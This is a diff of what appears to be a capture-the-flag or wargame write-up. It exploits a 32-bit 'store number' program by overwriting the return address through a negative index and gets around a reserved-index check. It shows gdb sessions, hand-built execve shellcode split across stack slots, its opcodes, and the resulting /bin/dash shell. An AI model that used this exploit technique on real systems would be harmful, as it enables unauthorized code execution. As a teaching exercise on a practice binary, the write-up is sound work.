@@ -37,15 +37,25 @@ Input command: store
 
 
 [-------------------------------------code-------------------------------------]
-   0x80489b1 <store_number+154>:    mov    eax,DWORD PTR [ebp+0x8]
-   0x80489b4 <store_number+157>:    add    edx,eax
-   0x80489b6 <store_number+159>:    mov    eax,DWORD PTR [ebp-0xc]
+
+0x80489b1 <store_number+154>:    mov    eax,DWORD PTR [ebp+0x8]
+
+0x80489b4 <store_number+157>:    add    edx,eax
+
+0x80489b6 <store_number+159>:    mov    eax,DWORD PTR [ebp-0xc]
+
 => 0x80489b9 <store_number+162>:    mov    DWORD PTR [edx],eax
-   0x80489bb <store_number+164>:    mov    eax,0x0
-   0x80489c0 <store_number+169>:    leave  
-   0x80489c1 <store_number+170>:    ret    
-   0x80489c2 <read_number>:    push   ebp
+
+0x80489bb <store_number+164>:    mov    eax,0x0
+
+0x80489c0 <store_number+169>:    leave  
+
+0x80489c1 <store_number+170>:    ret    
+
+0x80489c2 <read_number>:    push   ebp
+
 [------------------------------------stack-------------------------------------]
+
 0000| 0xbffff1f0 --> 0x8048cdd (" Index: ")
 
 mov [edx], eax
@@ -64,6 +74,7 @@ So, if I write anything at ebp + 4, then it will be popped into eip. (Stack grow
 Now, we need to find the difference between data[0] and ebp and divide by 4 bytes.
 
 gdb-peda$ p/x $ebp
+
 $2 = 0xbffff218
 
 So ebp is at 0xbffff218. data[0] is at 0xbffff238
@@ -85,6 +96,7 @@ Input command: store
 This is the protection mechanism. 
 
 Every index which is a multiple of 3 is reserved.
+
 (-7) = (FFFFFFFFFFFFFFF9) in hex, which is a multiple of 3.
 
 So, we cannot overwrite function return value.
@@ -94,13 +106,21 @@ Lets see the main function.
 The disassembly of the last few lines is : 
 
  0x08048c26:             call   0x8048780 <memset@plt>
-   0x08048c2b <+537>:    jmp    0x8048aec <main+218>
-   0x08048c30 <+542>:    mov    eax,0x0
-   0x08048c35 <+547>:    lea    esp,[ebp-0x8]
-   0x08048c38 <+550>:    pop    ebx
-   0x08048c39 <+551>:    pop    edi
-   0x08048c3a <+552>:    pop    ebp
-   0x08048c3b <+553>:    ret    
+
+0x08048c2b <+537>:    jmp    0x8048aec <main+218>
+
+0x08048c30 <+542>:    mov    eax,0x0
+
+0x08048c35 <+547>:    lea    esp,[ebp-0x8]
+
+0x08048c38 <+550>:    pop    ebx
+
+0x08048c39 <+551>:    pop    edi
+
+0x08048c3a <+552>:    pop    ebp
+
+0x08048c3b <+553>:    ret    
+
 End of assembler dump.
 gdb-peda$ 
 
@@ -113,79 +133,142 @@ Offset = 109
 Lets test it out.
 
 gdb-peda$ b *0x08048c3b
+
 Breakpoint 2 at 0x8048c3b
+
 gdb-peda$ c
+
 Continuing.
- Completed store command successfully
+
+Completed store command successfully
+
 Input command: quit
 
  [----------------------------------registers-----------------------------------]
+
 EAX: 0x0 
+
 EBX: 0x0 
+
 ECX: 0x74 ('t')
+
 EDX: 0xbffff3c8 ("quit")
+
 ESI: 0x1 
+
 EDI: 0xb7fb5000 --> 0x1b2db0 
+
 EBP: 0x0 
+
 ESP: 0xbffff3ec --> 0x7b ('{')
+
 EIP: 0x8048c3b (<main+553>:    ret)
+
 EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
 [-------------------------------------code-------------------------------------]
-   0x8048c38 <main+550>:    pop    ebx
-   0x8048c39 <main+551>:    pop    edi
-   0x8048c3a <main+552>:    pop    ebp
+
+0x8048c38 <main+550>:    pop    ebx
+
+0x8048c39 <main+551>:    pop    edi
+
+0x8048c3a <main+552>:    pop    ebp
+
 => 0x8048c3b <main+553>:    ret    
-   0x8048c3c:    xchg   ax,ax
-   0x8048c3e:    xchg   ax,ax
-   0x8048c40 <__libc_csu_init>:    push   ebp
-   0x8048c41 <__libc_csu_init+1>:    push   edi
+
+0x8048c3c:    xchg   ax,ax
+
+0x8048c3e:    xchg   ax,ax
+
+0x8048c40 <__libc_csu_init>:    push   ebp
+
+0x8048c41 <__libc_csu_init+1>:    push   edi
+
 [------------------------------------stack-------------------------------------]
+
 0000| 0xbffff3ec --> 0x7b ('{')
+
 0004| 0xbffff3f0 --> 0x1 
+
 0008| 0xbffff3f4 --> 0xbffff488 --> 0x0 
+
 0012| 0xbffff3f8 --> 0xbffff538 --> 0x0 
+
 0016| 0xbffff3fc --> 0x0 
+
 0020| 0xbffff400 --> 0x0 
+
 0024| 0xbffff404 --> 0x0 
+
 0028| 0xbffff408 --> 0xb7fb5000 --> 0x1b2db0 
+
 [------------------------------------------------------------------------------]
+
 Legend: code, data, rodata, value
 
 
 
 Breakpoint 2, 0x08048c3b in main ()
+
 gdb-peda$ x/x $esp
+
 0xbffff3ec:    0x0000007b
+
 gdb-peda$ c
+
 Continuing.
 
 Program received signal SIGSEGV, Segmentation fault.
 
  [----------------------------------registers-----------------------------------]
+
 EAX: 0x0 
+
 EBX: 0x0 
+
 ECX: 0x74 ('t')
+
 EDX: 0xbffff3c8 ("quit")
+
 ESI: 0x1 
+
 EDI: 0xb7fb5000 --> 0x1b2db0 
+
 EBP: 0x0 
+
 ESP: 0xbffff3f0 --> 0x1 
+
 EIP: 0x7b ('{')
+
 EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+
 [-------------------------------------code-------------------------------------]
+
 Invalid $PC address: 0x7b
+
 [------------------------------------stack-------------------------------------]
+
 0000| 0xbffff3f0 --> 0x1 
+
 0004| 0xbffff3f4 --> 0xbffff488 --> 0x0 
+
 0008| 0xbffff3f8 --> 0xbffff538 --> 0x0 
+
 0012| 0xbffff3fc --> 0x0 
+
 0016| 0xbffff400 --> 0x0 
+
 0020| 0xbffff404 --> 0x0 
+
 0024| 0xbffff408 --> 0xb7fb5000 --> 0x1b2db0 
+
 0028| 0xbffff40c --> 0xb7fffc04 --> 0x0 
+
 [------------------------------------------------------------------------------]
+
 Legend: code, data, rodata, value
+
 Stopped reason: SIGSEGV
+
 0x0000007b in ?? ()
 
 So we hit EIP. Now, let's see what we can do.
@@ -212,74 +295,124 @@ So, we only need to write the addresses we should jmp to
 Here is how the stack would look like:
 
 index 109 : 0xbffff23c --> jmp to start of shellcode
-      110 : 0xbffff248 --> Memory jumps
-      111 : GARBAGE
-      112 : 0xbffff254
-      113 : 0xbffff260
+
+110 : 0xbffff248 --> Memory jumps
+
+111 : GARBAGE
+
+112 : 0xbffff254
+
+113 : 0xbffff260
 
 Here are my assembly instructions for the same : 
 
 push   0x68732f2f
+
 pop ecx   ; ecx --> //sh
+
 nop
+
 ret
 
 push   0x6e69622f
+
 pop edx   ; edx --> /bin
+
 pop esi   ; pop garbage
+
 ret
 
 xor eax, eax
+
 pop esi   ; pop MEM_JMP1 from stack into esi
+
 pop edi   ; pop the 3rd garbage value off the stack
+
 pop edi   ; pop MEM_JMP2 from stack into edi  
+
 jmp esi
 
 push eax
+
 push ecx
+
 push edx
+
 mov ebx, esp
+
 jmp edi
 
 pop edi
+
 pop edi
+
 pop edi
+
 pop edi
+
 jmp edi
 
 xor ecx, ecx
+
 mov al, 0xb   ; execve system call is 11. See unistd_32.h and man execve
+
 int 0x80
 
 I ran this in the online assembler at https://defuse.ca/online-x86-assembler.htm
 
 
 Disassembly:
+
 0:  68 2f 2f 73 68          push   0x68732f2f
+
 5:  59                      pop    ecx
+
 6:  90                      nop
+
 7:  c3                      ret
+
 8:  68 2f 62 69 6e          push   0x6e69622f
+
 d:  5a                      pop    edx
+
 e:  5e                      pop    esi
+
 f:  c3                      ret
+
 10: 31 c0                   xor    eax,eax
+
 12: 5e                      pop    esi
+
 13: 5f                      pop    edi
+
 14: 5f                      pop    edi
+
 15: ff e6                   jmp    esi
+
 17: 50                      push   eax
+
 18: 51                      push   ecx
+
 19: 52                      push   edx
+
 1a: 89 e3                   mov    ebx,esp
+
 1c: ff e7                   jmp    edi
+
 1e: 5f                      pop    edi
+
 1f: 5f                      pop    edi
+
 20: 5f                      pop    edi
+
 21: 5f                      pop    edi
+
 22: ff e7                   jmp    edi
+
 24: 31 c9                   xor    ecx,ecx
+
 26: b0 0b                   mov    al,0xb
+
 28: cd 80                   int    0x80
 
 
@@ -290,6 +423,7 @@ To see assembly instructions, use x/i <Address> in GDB.
 
 First group them in 4s and then read the opcodes in reverse (coz its little endian). Then compute the numberical decimal equivalent of
 the obtained hex values.
+
 Eg. 68 2f 2f 73
     68 59 90 c3
     
@@ -303,6 +437,7 @@ Eg. 68 2f 2f 73
 Now, all that was left was to convert the opcodes found into decimal and then store those values. All this effort surely bears fruit
 
 after entering, be sure to check the instructions.
+
 0xbffff23c --> start of shellcode
 
 If you have entered correctly, you will see this:
@@ -368,6 +503,7 @@ gdb-peda$ x/30xi 0xbffff23c
    0xbffff26c:    pop    edi
    
    0xbffff26d:    pop    edi
+
 gdb-peda$ 
 
 0xbffff26e:    pop    edi
@@ -396,28 +532,44 @@ gdb-peda$
 
 
 gdb-peda$ x/xs $ebx
+
 0xbffff3fc:    "/bin//sh"
+
 gdb-peda$ x/xs $ecx
+
 0x0:    <error: Cannot access memory at address 0x0>
 
 
 STACK FRAME : 
 
 gdb-peda$ x/7xw $esp
+
 0xbffff3f0:    0xbffff248    0xbffff488    0xbffff254    0xbffff260
+
 0xbffff400:    0x00000000    0xbffff26c    0xbffff278
 
 gdb-peda$ x/4xi $eip
+
 => 0xbffff27c:    int    0x80
-   0xbffff27e:    nop
-   0xbffff27f:    nop
-   0xbffff280:    add    BYTE PTR [eax],al
+
+0xbffff27e:    nop
+
+0xbffff27f:    nop
+
+0xbffff280:    add    BYTE PTR [eax],al
+
 gdb-peda$ stepi
+
 process 6579 is executing new program: /bin/dash
+
 Warning:
+
 Cannot insert breakpoint 1.
+
 Cannot access memory at address 0x80489b9
+
 Cannot insert breakpoint 2.
+
 Cannot access memory at address 0x8048c3b
 
 There we go. (GDB executed /bin/dash as its own security feature)
